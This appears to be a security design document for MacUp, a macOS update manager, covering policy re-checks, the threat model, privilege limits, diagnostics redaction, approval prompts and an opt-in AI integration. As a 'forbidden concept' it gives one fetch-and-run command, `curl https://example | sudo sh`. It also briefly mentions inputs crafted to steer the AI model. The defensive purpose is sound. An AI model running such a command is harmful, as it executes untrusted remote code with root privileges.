# Trust and Security

## Trust Contract

MacUp publicly commits to:

1. No hidden changes.
2. Read-only means no package/runtimes are modified.
3. Users can inspect a change before execution.
4. MacUp does not store admin passwords.
5. MacUp uses existing package managers instead of replacing them.
6. Saved exclusions/policies are enforced at execution time.
7. Major/unknown/high-risk changes require review.
8. Local inventory stays local by default.
9. Telemetry is off unless the user opts in.
10. Core behavior is open source.
11. Modification attempts are logged.
12. Rollback claims are capability-specific and truthful.
13. Ambiguity causes MacUp to stop/skip rather than guess.
14. MacUp runs only the commands it showed you.
15. MacUp sends nothing over the network of its own unless you turn on AI
    help, and then only what you ask about (see "The opt-in AI boundary").

Items 3, 6, 7, 11, 13, and 14 used to be descriptions of intent. They are now
properties of the code, and "Before MacUp changes anything" below says which
type enforces each one. Where a promise and a mechanism disagree, the
mechanism is what the user actually gets, so the mechanism is what is
documented.

## Before MacUp changes anything

MacUp can now modify the machine. This section is the part of the document
that matters most, because everything above it is a promise and this is the
mechanism.

Every one of the following must hold before a single modifying command is
launched. Any one of them failing is a skip with a reason, never a guess.

1. **The configuration could be read.** Not "read approximately" — read
   without errors.
2. **The provider is enabled** in that configuration.
3. **The provider does not pin the item** itself.
4. **Policy allows it**, resolved per-item, then per-provider, then global.
5. **Risk does not raise the bar** past what policy granted. An `auto` item
   whose change is a macOS update, needs an administrator, needs a restart,
   would rewrite a config file or lockfile, is a major runtime change, or
   whose risk MacUp could not judge, still waits for a person.
6. **There is a plan**, built by the owning provider, carrying the exact
   executable and argument array.
7. **Policy still allows it**, re-read from the file immediately before the
   command runs.
8. **A `confirm` decision was actually confirmed**, by a caller that had
   somebody there to confirm it.
9. **The command is in that plan** — same executable, same arguments, same
   effect.
10. **The command matches a reviewed modifying rule.**
11. **The owning provider is loaded and locatable**, so MacUp knows what
    environment the command needs and can read the result back.
12. **The plan gives every step a usable time limit.**

Nothing in this list is enforced by convention. Items 1 to 5 are
`PolicyEngine`; 7 and 8 are the execution engine's own re-check; 9 and 10 are
`ExecutionGuard` and `ModifyingCommandRules`; 11 and 12 are the execution
engine refusing to run a plan it cannot carry out faithfully.
`docs/ARCHITECTURE.md` describes how they fit together.

### Policy is read again, immediately before the command

The plan a user reviewed was built from a copy of the configuration. That
copy can be minutes old. So the execution engine re-reads the configuration
file and re-asks the policy engine for every item, immediately before that
item runs (CLAUDE.md §2.20).

Planning-time policy is not enough, and the reason is ordinary rather than
exotic. A user reviews a list of twenty updates, notices one they do not
want, excludes it, and then confirms the batch. A scheduled run's plan may
have been written before the user changed a rule. In both cases the rule they
have now is the one that should win, and the only way to be sure of that is
to read it now. An exclusion that only applied at the moment a list was
generated would not be an exclusion; it would be a filter on a screen.

The re-check is the decisive one, not a second opinion. If the file now says
`ignore`, the item is skipped even though it is sitting in an approved plan.

### An unreadable configuration allows nothing

If MacUp cannot read its configuration file without errors, every policy
decision is `deny`.

This is not caution for its own sake. **The rules saying which items are
excluded are exactly the rules it could not read.** A configuration MacUp
misparsed might contain `"brew:postgresql": {"policy": "ignore"}` — and
falling back to a permissive default would then upgrade the one package the
user was most careful about. Failing closed is the only reading of a
half-understood file that cannot betray its author.

The same reasoning applies in the other direction, to writing. `PolicyEditor`
refuses to save a configuration that has errors, because MacUp writes the
file by re-encoding what it understood; rewriting a file it misread could
drop the exclusions the user is relying on. See `docs/CONFIGURATION.md`.

A file that other local users could change is a separate and stronger case:
it is ignored entirely, built-in defaults apply, and automatic modification
stays off. A file MacUp does not control cannot be allowed to choose which
executables MacUp runs.

### A provider-pinned item is never unpinned

When a provider itself holds an item back — `brew pin` is the case that
exists today — the policy decision is `deny`, whatever the MacUp policy says,
and the Homebrew planner refuses to build a plan for it as well.

A pin is a decision the user already made, in another tool, deliberately.
MacUp could technically unpin, upgrade, and re-pin. It does not, because the
user would have no way to know that happened, and the whole point of MacUp is
that nothing happens to your machine that you could not have predicted from
what MacUp showed you. If you want the upgrade, unpin it yourself; MacUp will
then plan it like anything else.

MacUp's own `pin` policy is a separate, weaker thing: a MacUp-level "hold at
the current version" that MacUp honors. It does not touch the provider's pin
state in either direction.

### A failure stops the run short of high-risk changes

Items run one at a time. A step that does not succeed ends that item — the
later steps of a plan were written assuming the earlier ones worked.

A failure also changes what the *rest of the run* is willing to do: from that
point on, any remaining item whose risk is `high` or `unknown` is skipped,
with that as the reason. This is not a blanket abort, which would be worse
for a batch of small patch updates; it is narrower and better justified than
that. After a failure MacUp no longer knows the state of the machine as well
as it did when the plans were written. The plans still on the list were
described against a machine that has since half-changed. Carrying on through
the changes that would be hardest to unpick, on a description MacUp can no
longer vouch for, is exactly the guessing the trust contract forbids
(CLAUDE.md §2.23, §24 Phase 3).

Low and moderate risk items continue, because MacUp can still say what they
are. A caller that wants the stricter behavior can ask for it
(`stopOnFailure`), and cancellation stops the run outright.

### Rollback is reported as unavailable, not promised

Every plan MacUp builds today reports rollback as **unavailable**, with the
explanation that MacUp has no tested rollback strategy for that action.

The model has three states — available, unavailable, unknown — and the
honest answer is currently the middle one for every action, so that is what
is reported. It would be easy to write something that usually works:
`brew upgrade` leaves the old keg on disk, npm can install a named older
version, mise keeps previous runtimes. None of those are rollback. They do
not restore linked binaries, rebuilt dependents, migrated data directories,
or a lockfile that has already been rewritten, and a user who read the word
"rollback" would reasonably expect all of that.

Rule 22 of the trust contract exists so that the day MacUp does say
"available", it means a specific provider action with an implemented and
tested strategy behind it — not a general reassurance. Until then the field
says unavailable, which is information, rather than unknown, which would be
an evasion.

### What history records, and what it refuses to record

History is a trust feature, not a log (CLAUDE.md §16). It is the record that
makes everything above checkable after the fact, so it is held to the
configuration file's rules.

It records, one JSON object per line in `~/.local/state/macup/history.jsonl`:

- when, and where the run came from — CLI, app, or scheduled
- the item and its provider
- the version before, the version the plan targeted, and the version MacUp
  observed afterwards — read back, with a read-only command, after a success
  and after an attempt that started a command and did not succeed, together
  with anything else that read-back showed, such as a formula left unlinked
- the exact commands as they were displayed to the user
- the outcome, and the verification outcome
- an error summary when something failed
- how long it took
- **every skip, with its reason.** An item MacUp decided not to change is
  part of what it did, and the reason is the useful half. An audit log that
  only listed successes would answer the least interesting question.

It refuses to record:

- passwords, tokens, authorization headers, and secrets from the
  environment. Entries are redacted as the engine builds them and redacted
  again by the store, so a caller that forgets cannot put a secret in the
  audit log.
- a dry run. Nothing was attempted, so there is nothing to record.
- an entry it cannot encode, or one containing a line break, which would
  silently split into two unreadable lines.
- a guess about a line it cannot read back. Undecodable lines are counted and
  reported as a finding, never interpreted.

The file itself is treated as owner-only data: created `0600` inside a `0700`
directory, opened `O_NOFOLLOW` relative to an opened directory descriptor so
it is never written through a symlink or into a directory somebody else could
change, checked to be a regular file MacUp owns, and `fsync`ed. Trimming to
the entry limit replaces the file by atomic rename, so a crash during a trim
cannot lose the entries it was keeping.

History that could not be written is reported to the system log and does not
abort the run. Refusing to update because a log file is unwritable would be a
worse answer than an incomplete log — but the failure is never silent.

## Threat model

Assets:
- user's developer environment
- executable search path
- package-manager configuration
- shell/runtime configuration
- credentials present in environment
- local filesystem
- administrator authorization
- trust in signed MacUp releases

Threats:
- command injection via package names/provider output
- PATH hijacking
- malicious or compromised upstream package
- parser confusion causing wrong target
- policy race/change between planning and execution
- accidental privilege escalation
- logging secrets
- corrupted configuration changing policy
- compromised update distribution
- symlink/path attacks on writable files
- malicious project-local config affecting global maintenance
- remote command capability introduced later

Mitigations:
- argument arrays, no shell interpolation
- explicit executable path
- provider output validation
- two command allowlists: one bounding what a check may run, one bounding
  what an update may run
- an execution guard that additionally refuses any command not in the plan
  the user reviewed
- positional arguments checked, not trusted: no leading `-`, no control or
  bidirectional-override characters, and an exact count so an upgrade can
  never be launched naming nothing
- policy re-check before execute
- one item at a time; no overlapping modifications
- local-first
- atomic config
- strict file permissions where appropriate
- log redaction, applied twice on the path into history
- signed/notarized release
- checksums
- dependency minimization
- no root daemon
- no remote arbitrary command schema

## Doctor

Doctor answers "why does this machine behave the way it does". Eleven
deterministic checks read the result of one read-only check and say what they
saw; none of them is a model, a heuristic score, or a repair.

Three properties are the trust-relevant ones.

**It changes nothing, and it offers to change nothing.** Doctor explains. It
has no fix action, not even an opt-in one, because a diagnostic that also
repairs is a diagnostic you cannot run to find out what is going on.

**It issues exactly one command**: reading the user's login shell, so it can
say whether MacUp sees the same `PATH` a terminal does. That goes through the
same `CommandRunning` abstraction as everything else, with effect
`readOnly`, and the captured environment is compared and then dropped rather
than logged or stored. Everything else — architectures, ownership, directory
permissions — is read from bytes or from `stat`, never from a subprocess. Two
tests pin this: one asserts Doctor records no commands at all when the shell
reader is stubbed, the other that every command it does record is read-only.

**A fact MacUp does not have becomes a finding that says so**, never a
guess. An architecture MacUp cannot interpret is reported as undetermined and
produces no finding at all. A launchd state it could not ask about is
reported as unknown rather than as running. A directory it could not inspect
is reported as unknown rather than as safe. Provider output it could not
parse is reported as unparsed rather than as a partial list.

Findings carry stable, namespaced identifiers (for example
`homebrew.multipleInstallations`, `paths.directoryWritableByOthers`) because
scripts will match on them, and they are ordered deterministically — most
severe first, then by identifier, then title, then detail — so two runs over
one machine produce the same output.

Severity is a judgment rather than decoration. A provider that is not
installed is information: most Macs do not have all four. A directory another
user can write is an error, because it decides what MacUp is allowed to
change. A `PATH` missing directories the login shell has is a warning,
because a tool living only there is one MacUp will not find; a `PATH` with
extra directories is information, because that is what running from an
editor's terminal looks like.

Everything that reaches a finding is redacted and sanitized first: provider
output is untrusted input, the home directory becomes `~` so a pasted report
carries no username, and no finding ever prints an environment variable's
value. A test plants `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and
`NODE_OPTIONS` in the environment and asserts that no finding contains their
values.

## Exported diagnostics

Export Diagnostics (`macup diagnostics`, and Settings → Diagnostics in the
app) is the one place MacUp's local inventory is packaged to leave the Mac,
so it is held to the privacy rules (CLAUDE.md §2.15, §16, §18) by mechanism
rather than by care:

- **It is an explicit action with a preview.** `preview` and the app's sheet
  show the exact bytes before anything is written; both come from one
  rendering of one look at the Mac, so what was shown is what is saved.
  MacUp never sends the file anywhere.
- **Fields are chosen, not inherited.** `DiagnosticsDocument` lists every
  field it writes. A property added to a model later does not reach the file
  until someone adds it there, and every string passes through one scrubber:
  `Redactor`, the home folder as `~`, the account name on its own as `<user>`,
  control and bidirectional characters escaped.
- **No environment variables.** Nothing from the process or login-shell
  environment is copied in; only Doctor's findings, which can name folders on
  `PATH`. Tests plant tokens and a custom variable and assert neither their
  values nor the custom name appear.
- **Package names are placeholders by default**, because what someone has
  installed can identify their employer, their projects, or an outdated
  version worth attacking. Placeholders are numbered by first mention, so a
  number reveals nothing about names the file never shows; free text is
  masked too, including cask display names, npm scopes, and third-party taps.
  The one exception is MacUp's own vocabulary — the runtimes and package
  managers its source recognizes by name — because Doctor's findings are
  written in those terms and they identify nobody. Versions are kept; they
  are what most bug reports are about. Item notes are never included.
- **The file is new or it is nothing.** It is created with `O_CREAT |
  O_EXCL | O_NOFOLLOW` relative to an opened folder, owner-only (`0600`,
  `fchmod`ed past the umask), and removed if writing fails part-way. An
  existing file is never replaced and a symbolic link at the destination —
  even a dangling one — is refused. The folders above it are the user's
  choice. The CLI's default is the current directory rather than the Desktop,
  which iCloud Drive may sync.

## Privilege

The main process runs as the user.

Scheduling does not change that. `macup schedule enable` installs a per-user
LaunchAgent in `~/Library/LaunchAgents`, loaded into the user's own launchd
domain (`gui/<uid>`). There is no `LaunchDaemon`, no root, no privilege
helper, no authorization prompt, and no process running between checks. The
scheduled job runs `macup check --save-state`, which cannot install, upgrade,
or remove anything. `macup schedule disable` unloads the job and deletes the
property list, and `macup schedule status` shows the exact command that would
run, so an installed schedule is never something you have to take on trust.


Updates do not change that either. MacUp never uses `sudo` and holds no
password. Where a change may genuinely need one — a Homebrew cask that
installs through a macOS installer package is the case that exists — the plan
says so before it runs, the prompt comes from Homebrew and macOS rather than
from MacUp, and MacUp neither supplies nor stores an answer. If a global npm
prefix is not the user's to write, npm fails and says so; MacUp does not
escalate to make it work.

An unattended run refuses such a plan outright. Nobody is there to answer an
authorization prompt, and a scheduled job that sat waiting on one would be
worse than a scheduled job that skipped and explained. The same rule covers
anything that may require a restart.

When an operation legitimately needs authorization:
- explain why
- let macOS present standard authorization
- never collect the password in MacUp UI
- avoid custom privilege helpers until a separately reviewed need exists

## Approval, and what it is not

MacUp can require the device owner's approval before it changes anything
(`macup security require on`, or Settings → Approval). macOS does the asking
through `LocalAuthentication`, with whatever sensor the Mac reports — Touch
ID, Face ID, or Optic ID — and the login password or an unlocked Apple Watch
as the fallback. MacUp passes a reason string it wrote itself and receives a
yes or a no. It never sees, stores, or transmits a fingerprint, a face, or a
password, which is the same rule as rule 9 of the trust contract.

It is deliberately described as a confirmation, never as a lock:

- MacUp runs as the user. Anyone at an unlocked Mac can run `brew`, `npm`, or
  `mise` directly, with no prompt from anyone.
- The configuration file is the user's own file and can be edited to turn the
  requirement off. MacUp does not defend against its owner.
- There is no secret for the OS to withhold: v1 has no account, no tokens, and
  no cloud, so there is nothing to put behind a Keychain access-control list,
  which is where macOS would really enforce biometrics.

What it does buy is one deliberate step in front of every change MacUp itself
makes, enforced in one place (`ApprovalGate`) for the CLI and the app alike,
so a future modifying action cannot quietly skip it. Approval that MacUp could
not obtain is a refusal, not a pass.

### The camera face match

MacUp does include a face check of its own, off by default, and it is
documented here rather than advertised, because it is not security.

macOS exposes no face-recognition API: Vision finds *a* face in a picture and
does not tell you whose. What MacUp does is crop to the face and compare
Vision image feature prints — a measure of how alike two pictures look. A
photograph of the enrolled person passes it. There is no Secure Enclave, no
liveness check, and no macOS enforcement behind it.

It is constrained so that it cannot be mistaken for a lock:

- It can only approve early. A face that does not match falls through to the
  macOS prompt rather than refusing, so it can never lock anyone out, and it
  never replaces the macOS check as the only way through.
- It reports `cameraFace`, never `faceID`, so what approved a change is always
  distinguishable from a hardware sensor in the UI, the logs, and `--json`.
- It does nothing unless approval is also required; the validator warns when
  it is on and inert.
- What is stored is a list of numbers derived from the pictures, owner-only in
  the state directory. No image is kept, nothing leaves the Mac, and the
  camera is open only for the moment of capture, recording light on.
- Enrolment reports how far apart the enrolled samples of one face are, so the
  threshold can be judged rather than trusted. When the spread is wider than
  the threshold, MacUp says matching cannot work.

If this feature were ever presented as protecting anything, that would be
misrepresentation. It is a convenience for its owner, on their own machine,
and every surface that shows it says so.

## The opt-in AI boundary

MacUp can ask TypeSafe (a System One model, `api.typesafe.ai`) two kinds of
question: what a request typed in plain words means ("Ask MacUp", `macup
ask`), and whether an update needs extra care ("AI caution", `macup
insight`). v1's rule is no cloud dependency and no AI assistant, so this is
built as an extension that is off by default, and every rule above still
holds with it on.

**Off means off.** With AI help off — the default — MacUp makes no network
request of its own and behaves exactly as it does without the feature: the
configuration file has no `ai` section, saved estimates are not applied, the
toolbar has no Ask MacUp button, and the Updates screen has no AI section.
Nothing leaves the Mac until the user has saved their own API key **and**
switched AI help on after being shown exactly what is sent. There are no
background, scheduled, or retrying-later requests: every request is caused by
a command or a button, and the scheduled job still runs only `macup check`.

**What is sent is listed, and nothing else is.** `macup ai disclosure` and
"What MacUp sends" in the app show `AIDisclosure.standard`, and the tests
read the bodies MacUp builds and check them against it:

- Ask MacUp: what the user typed (at most 300 characters, after `Redactor`
  removes anything secret-shaped and the home folder becomes `~`), and the
  IDs and names of packages the last check found, each with its package
  manager (at most 254); plus MacUp's fixed questions and answer choices.
- AI caution: one update's package ID and name, its package manager and
  kind, and its installed and available versions.
- Connection test: a fixed sentence and one fixed question.
- With every request: the key in the `Authorization` header, the model name,
  and `MacUp/<version>` as the user agent, set explicitly with a fixed
  `Accept-Language` so macOS does not add the system's version and language.

Never sent: environment variables, file paths, file contents (the
configuration included), shell history, tokens other than the TypeSafe key,
and anything the user did not ask about. How TypeSafe handles what it
receives, retention included, is TypeSafe's to state; MacUp links its [Data
Processing Agreement](https://typesafe.ai/legal/data-processing) rather than
paraphrasing it.

**One host, one file, checked by CI.** `LiveTypeSafeTransport` is the only
code in MacUp that opens a network connection, and
`scripts/check-trust-invariants.sh` fails the build if networking appears
anywhere else. It sends HTTPS to `https://api.typesafe.ai/v1/systemone` and
nowhere else: the host is a constant, checked before the request and again on
the response; every redirect is refused, so the key cannot follow one; the
session is ephemeral (no cookies, cache, or stored credentials) and is not
even created until the first request. `TYPESAFE_BASE_URL`, which TypeSafe's
own SDKs honor, is ignored, so nothing in the environment can choose where
the key goes. A request times out after 20 seconds; HTTP 429 and 529 are
retried at most twice, after 0.5 and 1 second (or a `Retry-After` of up to
5 seconds), and nothing else is retried.

**The key.** It is looked for in MacUp's Keychain item (generic password,
service `dev.macup.typesafe`, account `api-key`, in the login keychain), then
in `TYPESAFE_API_KEY`; a Keychain item that cannot be read is an error, not a
reason to use a different key. It is never written to the configuration,
history, logs, or diagnostics. `TypeSafeAPIKey` prints as `<redacted>` in
every form, the request's description and mirror leave the header out, the
only thing logged about a request is its status and timing, and anything
TypeSafe sends back is scrubbed of the key and redacted before it is kept.
The CLI reads a key with echo off or from a pipe and refuses one given as an
argument, without repeating it. Status screens only ask whether an item
exists and never read the key itself; it is read when a request is about to
be made, and any prompt about that comes from macOS, not MacUp.

**An answer can only add caution or propose.** TypeSafe answers closed
questions — a Choice over MacUp's own list of actions, over the packages
MacUp found, over the four policies and four providers, over stretches of the
user's own words for a note — so it can pick, never invent. Code composes
the answers:

- Ask MacUp trusts a reading only as far as the least confident answer it
  uses; under 60% it shows best guesses and changes nothing. A change is
  shown exactly (what, where in the file, the current value, the equivalent
  command) and made only after the user confirms it, through the approval
  gate and `PolicyEditor`, the one path every rule change takes. `macup ask
  --yes` applies a change unseen only when it is at least 85% sure and the
  change makes MacUp more careful; it never sets Auto Update, turns a
  provider back on, or stops skipping a version. "Why is X held?" reads the
  rules and the last check and changes nothing.
- AI caution adds, at most, a note that says it is an AI estimate from
  TypeSafe and how sure it was, and the `aiCaution` risk signal. The signal
  raises risk to at least moderate — never lowering it, and leaving an
  unclassifiable change unknown so it still asks on its own — and the policy
  engine asks first for it whatever `confirmMajorUpdates` says, so an Auto
  Update item waits for a person. The signal travels in the plan, so the
  re-check immediately before execution sees it too. Estimates are saved
  (owner-only, in the state directory) per version change and applied only
  while AI help is on; `macup ai forget` or Clear Estimates deletes them.

**It fails closed.** A reply that does not fit its questions — an option
MacUp did not offer, a probability outside 0…1, a missing or extra answer, a
choice that is not the most probable, a status MacUp does not expect — is not
used at all. An `ai` section MacUp cannot read is a configuration error, so
AI help stays off. A question MacUp built wrongly, or a request larger than
128 KiB, is never sent. macOS updates are never sent: they always wait for
the user anyway.

Threats this adds, and what answers them: a package name or typed request
written to steer the model (closed options, code composition, and the
user's confirmation of the exact change); the key leaking (redaction in every
printable form, the Keychain, no arguments); traffic going somewhere else
(one pinned host, refused redirects, a CI check); and silent use (off by
default, an explicit disclosure, no background requests).

## Remote architecture rule

If cloud/team functionality exists later, the server may express declarative desired state/policy, never arbitrary shell commands.

Allowed concept:
```json
{"tool":"node","policy":"pin","version":"24"}
```

Forbidden concept:
```json
{"command":"curl https://example | sudo sh"}
```

## Release security

Before public v1:
- Developer ID signature
- Apple notarization
- SHA-256 checksums
- GitHub protected release workflow
- documented build steps
- security reporting process
- dependency lock/review
- no secrets in repository or CI logs

## Incident principle

If MacUp causes or risks destructive behavior:
- stop release/update distribution if necessary
- disclose concrete scope
- provide remediation
- do not minimize impact
- add regression tests before restoring affected functionality
